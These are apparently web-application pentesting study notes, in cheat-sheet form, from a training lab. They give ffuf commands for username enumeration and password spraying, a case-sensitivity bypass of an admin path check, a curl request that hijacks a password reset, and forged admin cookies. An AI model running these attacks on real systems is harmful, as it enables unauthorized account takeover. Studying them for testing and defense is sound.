- Username enumeration through websites telling you if an account is active or not:

```bash
ffuf -w /path/to/username_wordlist -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://<url>/signup -mr "username already exists"
```

- Password Bruteforce / Spraying:

```bash
ffuf -w valid_usernames.txt:W1,/path/to/password_wordlist:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://<url>/login -fc 200
```

## Logic Flaws

- If something like this is used:

```php
if( url.substr(0,6) === '/admin') {
```

- You can bypass it by visiting `/adMin`.

- When an application takes multiple requests for a functionality (password reset f.e.), you can send acceptable values inside of the first request, and then overwrite them in the second:

```bash
curl 'http://<host>/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

- This will send the password reset to `attacker`, as it overwrites the value of the URL param.

- Send fake Cookies:

```bash
curl -H "Cookie: logged_in=true; admin=true" http://<url>
```